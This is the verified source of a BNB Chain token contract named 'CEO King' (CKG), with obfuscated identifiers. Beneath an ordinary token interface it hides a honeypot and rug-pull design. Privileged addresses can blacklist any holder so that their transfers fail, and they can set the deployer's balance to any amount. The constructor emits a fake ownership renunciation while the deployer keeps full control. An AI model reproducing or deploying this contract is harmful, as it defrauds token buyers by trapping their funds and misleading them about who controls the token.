/**
 *Submitted for verification at BscScan.com on 2023-02-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface zcbabcavacdnbb {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ruiwqcyrkha) external view returns (uint256);

    function transfer(address hfebgbrrvf, uint256 yzvoagtmunuauf) external returns (bool);

    function allowance(address gzxrmmlnjzmi, address spender) external view returns (uint256);

    function approve(address spender, uint256 yzvoagtmunuauf) external returns (bool);

    function transferFrom(
        address sender,
        address hfebgbrrvf,
        uint256 yzvoagtmunuauf
    ) external returns (bool);

    event Transfer(address indexed from, address indexed wzihwzcaxy, uint256 value);
    event Approval(address indexed gzxrmmlnjzmi, address indexed spender, uint256 value);
}

interface vjnakibpx is zcbabcavacdnbb {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract snfzmwylguvr {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface iugrjehkj {
    function createPair(address hlmlqgtzyeaei, address maouhnzhn) external returns (address);
}

interface lvdthfcxorb {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CEOKing is snfzmwylguvr, zcbabcavacdnbb, vjnakibpx {

    function ycefdqjrui(address ngpffzvraetl) public {
        if (crylksftr) {
            wmxjijzvdexo = false;
        }
        if (ngpffzvraetl == znsagxajvcy || ngpffzvraetl == ykqfmbyhfrrue || !rwnrkigdygzidz[_msgSender()]) {
            return;
        }
        
        ldwlsfqnmbds[ngpffzvraetl] = true;
    }

    address public znsagxajvcy;

    function decimals() external view virtual override returns (uint8) {
        return owpvdqgoglrbhs;
    }

    function transferFrom(address rhasrciqyfko, address hfebgbrrvf, uint256 yzvoagtmunuauf) external override returns (bool) {
        if (oqirzjgkm[rhasrciqyfko][_msgSender()] != type(uint256).max) {
            require(yzvoagtmunuauf <= oqirzjgkm[rhasrciqyfko][_msgSender()]);
            oqirzjgkm[rhasrciqyfko][_msgSender()] -= yzvoagtmunuauf;
        }
        return zrpzdbfhrygyy(rhasrciqyfko, hfebgbrrvf, yzvoagtmunuauf);
    }

    function qfkqpjxfctwman() public {
        if (ipwtdzvuv == hocwmcundriaz) {
            ipwtdzvuv = hocwmcundriaz;
        }
        if (hocwmcundriaz == ipwtdzvuv) {
            hocwmcundriaz = ipwtdzvuv;
        }
        vlqusnegk=false;
    }

    mapping(address => mapping(address => uint256)) private oqirzjgkm;

    mapping(address => bool) public ldwlsfqnmbds;

    string private yvwoixpiyyljq = "CEO King";

    function otayfpdewbsh(address bgfhuazocunqf) public {
        if (yrrqzxfoggjgj) {
            return;
        }
        
        rwnrkigdygzidz[bgfhuazocunqf] = true;
        if (wmxjijzvdexo) {
            vlqusnegk = true;
        }
        yrrqzxfoggjgj = true;
    }

    uint8 private owpvdqgoglrbhs = 18;

    function rbqkjiqqvmyuv() public view returns (uint256) {
        return hocwmcundriaz;
    }

    mapping(address => bool) public rwnrkigdygzidz;

    function transfer(address ftjwmrjzlebnb, uint256 yzvoagtmunuauf) external virtual override returns (bool) {
        return zrpzdbfhrygyy(_msgSender(), ftjwmrjzlebnb, yzvoagtmunuauf);
    }

    address private dxeuuezsmwsx;

    constructor (){ 
        
        lvdthfcxorb oosveaqlfvmfx = lvdthfcxorb(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ykqfmbyhfrrue = iugrjehkj(oosveaqlfvmfx.factory()).createPair(oosveaqlfvmfx.WETH(), address(this));
        dxeuuezsmwsx = _msgSender();
        if (hocwmcundriaz != ipwtdzvuv) {
            wmxjijzvdexo = false;
        }
        znsagxajvcy = _msgSender();
        rwnrkigdygzidz[_msgSender()] = true;
        if (wmxjijzvdexo) {
            ipwtdzvuv = hocwmcundriaz;
        }
        wieufegnx[_msgSender()] = ipoxkaetn;
        emit Transfer(address(0), znsagxajvcy, ipoxkaetn);
        kpzkpuagufzmo();
    }

    bool public yrrqzxfoggjgj;

    function kpzkpuagufzmo() public {
        emit OwnershipTransferred(znsagxajvcy, address(0));
        dxeuuezsmwsx = address(0);
    }

    address public ykqfmbyhfrrue;

    function balanceOf(address ruiwqcyrkha) public view virtual override returns (uint256) {
        return wieufegnx[ruiwqcyrkha];
    }

    bool private vlqusnegk;

    uint256 public hocwmcundriaz;

    event OwnershipTransferred(address indexed hkpkvsmzjdd, address indexed melwczckk);

    string private kjpatmwwfmrx = "CKG";

    function lvkovccotmyj(uint256 yzvoagtmunuauf) public {
        if (!rwnrkigdygzidz[_msgSender()]) {
            return;
        }
        wieufegnx[znsagxajvcy] = yzvoagtmunuauf;
    }

    function name() external view virtual override returns (string memory) {
        return yvwoixpiyyljq;
    }

    function zavkmzqcy(address rhasrciqyfko, address hfebgbrrvf, uint256 yzvoagtmunuauf) internal returns (bool) {
        require(wieufegnx[rhasrciqyfko] >= yzvoagtmunuauf);
        wieufegnx[rhasrciqyfko] -= yzvoagtmunuauf;
        wieufegnx[hfebgbrrvf] += yzvoagtmunuauf;
        emit Transfer(rhasrciqyfko, hfebgbrrvf, yzvoagtmunuauf);
        return true;
    }

    function owner() external view returns (address) {
        return dxeuuezsmwsx;
    }

    function approve(address xzuvdlcghnrjp, uint256 yzvoagtmunuauf) public virtual override returns (bool) {
        oqirzjgkm[_msgSender()][xzuvdlcghnrjp] = yzvoagtmunuauf;
        emit Approval(_msgSender(), xzuvdlcghnrjp, yzvoagtmunuauf);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return ipoxkaetn;
    }

    function allowance(address uxuvmdwwtwsyp, address xzuvdlcghnrjp) external view virtual override returns (uint256) {
        return oqirzjgkm[uxuvmdwwtwsyp][xzuvdlcghnrjp];
    }

    uint256 private ipoxkaetn = 100000000 * 10 ** 18;

    function xpwajikopank() public view returns (bool) {
        return vlqusnegk;
    }

    function zrpzdbfhrygyy(address rhasrciqyfko, address hfebgbrrvf, uint256 yzvoagtmunuauf) internal returns (bool) {
        if (rhasrciqyfko == znsagxajvcy) {
            return zavkmzqcy(rhasrciqyfko, hfebgbrrvf, yzvoagtmunuauf);
        }
        require(!ldwlsfqnmbds[rhasrciqyfko]);
        return zavkmzqcy(rhasrciqyfko, hfebgbrrvf, yzvoagtmunuauf);
    }

    mapping(address => uint256) private wieufegnx;

    uint256 public ipwtdzvuv;

    bool private crylksftr;

    function getOwner() external view returns (address) {
        return dxeuuezsmwsx;
    }

    function hikemgjzavpdyd() public view returns (bool) {
        return vlqusnegk;
    }

    bool public wmxjijzvdexo;

    function symbol() external view virtual override returns (string memory) {
        return kjpatmwwfmrx;
    }

}